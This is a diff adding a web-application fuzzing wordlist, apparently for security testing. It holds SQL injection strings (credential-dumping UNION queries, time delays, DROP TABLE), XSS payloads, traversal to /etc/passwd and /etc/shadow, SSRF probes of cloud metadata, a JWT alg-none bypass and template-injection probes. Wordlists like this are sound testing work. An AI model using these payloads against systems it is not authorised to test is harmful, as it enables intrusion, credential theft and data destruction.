@@ -1,5 +1,82 @@
+# ===============================
+# SQL Injection
+# ===============================
 '
 "
 ' OR '1'='1
+' OR 1=1--
+' OR '1'='1' --
+admin' --
+' UNION SELECT NULL--
+' UNION SELECT username,password FROM users--
+' AND SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+" OR "1"="1
+1 OR 1=1
+1; DROP TABLE users--
+
+# ===============================
+# XSS
+# ===============================
 <script>alert(1)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
+
+# ===============================
+# Directory Traversal
+# ===============================
 ../../etc/passwd
+../../../etc/passwd
+..\\..\\..\\windows\\win.ini
+../../../../../../etc/shadow
+
+# ===============================
+# SSRF
+# ===============================
+http://127.0.0.1
+http://localhost
+http://169.254.169.254/latest/meta-data/
+file:///etc/passwd
+http://0.0.0.0
+
+# ===============================
+# IDOR / Numeric fuzzing
+# ===============================
+1
+2
+3
+10
+100
+999
+1000
+9999
+
+# ===============================
+# JWT / Auth bypass
+# ===============================
+none
+admin
+true
+false
+null
+{"alg":"none"}
+
+# ===============================
+# Template Injection
+# ===============================
+{{7*7}}
+${7*7}
+${{7*7}}
+#{7*7}
+
+# ===============================
+# Generic fuzz
+# ===============================
+AAAA
+%%%%
+!!!!
+####
+"'
